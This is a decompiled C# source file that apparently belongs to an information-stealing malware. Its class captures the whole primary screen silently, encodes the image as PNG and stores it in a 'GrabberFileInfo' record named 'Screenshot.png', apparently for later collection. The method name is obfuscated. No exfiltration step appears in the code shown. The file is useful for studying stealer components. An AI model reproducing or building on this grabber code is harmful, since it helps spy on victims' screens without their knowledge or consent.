using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace hostik;

internal class Sc
{
	public static GrabberFileInfo gr_s;

	private static MemoryStream getScr(int P_0, int P_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap(P_0, P_1);
			try
			{
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.CopyFromScreen(new Point(0, 0), Point.Empty, ((Image)val).get_Size());
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Png());
				return new MemoryStream(memoryStream.ToArray());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
	}

	public static void ya_lubly_fe0syty()
	{
		string s = "";
		string s2 = "";
		try
		{
			s = Screen.get_PrimaryScreen().get_Bounds().Width.ToString();
			s2 = Screen.get_PrimaryScreen().get_Bounds().Height.ToString();
		}
		catch
		{
		}
		int p_ = int.Parse(s);
		int p_2 = int.Parse(s2);
		MemoryStream scr = getScr(p_, p_2);
		gr_s = new GrabberFileInfo
		{
			File = scr.ToArray(),
			name = "Screenshot.png"
		};
	}
}
